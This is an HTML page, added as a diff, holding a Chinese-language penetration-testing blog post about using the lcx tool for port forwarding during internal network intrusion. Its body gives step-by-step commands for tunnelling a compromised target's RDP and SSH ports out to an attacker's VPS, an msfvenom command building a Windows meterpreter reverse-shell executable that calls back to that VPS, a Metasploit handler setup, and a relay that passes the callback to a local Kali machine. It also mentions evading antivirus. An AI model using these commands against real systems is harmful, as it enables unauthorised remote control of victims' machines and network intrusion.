@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="通向彼岸 之内网代理转发 [ lcx篇 ]"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>通向彼岸 之内网代理转发 [ lcx篇 ] - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2016/09/09/lcx-porforward/">
+                通向彼岸 之内网代理转发 [ lcx篇 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-09</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/port-forward/">port forward</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br><br>linux,win 平台下都有相应的已经编译好的版本,后期我会把自己用的工具都打包提供给大家,原理想必大家早已经非常清楚,其实本来就非常简单,所以这里就不废话了,简单使用如下</p>
+<p>0x01 把来自外部的某个端口上的流量转到本地的某个端口上</p>
+<p>首先,在自己的vps上执行监听准备:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># lcx -listen 监听来自外部的某个端口上的流量 转发到指定的本地端口上</span></div><div class="line"><span class="comment"># lcx -listen 443 1234  把来自外部的443端口的流量转到本地的1234端口上</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/lcx_listen_win.png" alt=""></p>
+<p>而后,回到目标机器上去执行:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># lcx -slave 公网vps的ip  在vps上监听的端口  目标机器的ip 目标机器上指定的端口[通常是远程桌面或者ssh]</span></div><div class="line"><span class="comment"># lcx -slave 103.*.*.* 443 192.168.3.23 3389  把目标机器的3389端口的流量转发到自己vps的443端口上</span></div><div class="line"><span class="comment"># lcx -slave 103.*.*.* 443 192.168.3.23 22    把目标机器的22端口的流量转发到自己vps的443端口上</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/lcx_listen_win_slave.png" alt=""></p>
+<p>最后,再回到自己的vps上,看到连接正常建立,就可以用指定工具连接到目标机器上了:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">mstsc:</span> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="symbol">:</span><span class="number">1234</span>  连目标的远程桌面</div><div class="line"><span class="symbol">putty:</span> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">1234</span>  连目标的ssh</div></pre></td></tr></table></figure></p>
+<p>此时当你在本地访问 127.0.0.1 的1234端口其实就相当于访问目标机器的rdp[3389端口]或者ssh[22端口]<br><img src="/img/lcx_listen_win_slave_res.png" alt=""></p>
+<p>关于lcx在linux中的用法,大同小异,只是参数不同而已,如下:</p>
+<p>先在自己的vps上执行</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ./lcx -m 2 -p1 443 -h2 192.168.3.41[实际中可能是你vps的地址] -p2 1234  首先,还是在自己的vps上执行监听</span></div></pre></td></tr></table></figure>
+<p><img src="/img/lcx_linux_1.png" alt=""></p>
+<p>而后回到目标机器上执行</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ./lcx -m 3 -h1 192.168.3.40[目标机器的ip] -p1 22 -h2 192.168.3.41[vps的ip] -p2 443 到目标机器上执行,把目标机器的22端口转到vps的443端口上</span></div></pre></td></tr></table></figure>
+<p><img src="/img/lcx_linux_2.png" alt=""></p>
+<p>最后,再回到自己的vps上执行</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ssh root@127.0.0.1 -p 1234 观察到连接正常建立后,在vps上连接本地的1234端口实际连的就是目标机器[192.168.3.40]的22端口,效果如下</span></div></pre></td></tr></table></figure>
+<p><img src="/img/lcx_linux_3.png" alt=""><br><img src="/img/lcx_linux_4.png" alt=""></p>
+<p>0x02 把来自外部的某个端口上的流量转到指定的其它机器的某个端口上,典型应用场景,<code>把来自公网的meterpreter直接通过vps转到本地的msf中</code>,流程大致如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># lcx -tran 来自外部的端口 指定机器的ip 指定机器上的端口</span></div></pre></td></tr></table></figure></p>
+<p>1),先把本地的kali连到vpn内网中[我是直接用自己的vps搭的vpn],因为等会儿要走vpn内网做转发,所以必须先连到vpn内网中,这是第一个比较关键的地方<br><img src="/img/forien_meter.png" alt=""></p>
+<p>此时再回到vps上ping下kali所在的vpn内网ip,确认kali和vps之间通过vpn内网通信没有任何问题<br><img src="/img/forien_meter_1.png" alt=""></p>
+<p>2),然后,回到本地的kali中开始生成payload,注意这里payload回连的ip要写自己vps的公网ip<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=*.*.*.*[payload的回连ip要设成vps的] LPORT=8080 -f exe -o /root/Desktop/shell.exe</span></div></pre></td></tr></table></figure></p>
+<p>3),payload生成好以后,就可以开始监听了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler </div><div class="line">msf exploit(handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; set lhost <span class="number">172.16</span>.<span class="number">12.1</span>(本机的vpn内网ip) </div><div class="line">msf exploit(handler) &gt; set lport <span class="number">8080</span></div><div class="line">msf exploit(handler) &gt; exploit -j</div></pre></td></tr></table></figure></p>
+<p>4),第二个关键的地方,到vps上去做下转发,意思是把来自外部的8080[其实是我们自己的payload的回连端口]端口的流量通过vpn内网转到kali的8080端口上<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># lcx -tran 8080 172.16.12.1 8080</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/forien_meter_3.png" alt=""></p>
+<p>5),最后,把payload丢到目标上去执行,meterpreter被正常从公网弹回,稍微留意下这里的上线ip就知道,很显然,是通过vpn的内网ip过来的<br><img src="/img/forien_meter_4.png" alt=""></p>
+<p><br><br>关于lcx:<br>&nbsp;&nbsp;&nbsp;&nbsp;需要免杀,对于简单的内网还能凑活,对于现在的一些场景已经不能很好的适用了,个人在实际内网渗透过程中基本用的不多 [基本就是用来转下meterpreter和beef什么的],都是些简单辅助性的用途,工具也确实已经有些年头了,工具源码网上也到处都是,有兴趣可以仔细研读下[如果想自己过免杀的话],现在已经有很多更好的替代品,不过,这里还是感谢前辈们,在那个时代留给我们的财富<br><br></p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/port-forward/">#port forward</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
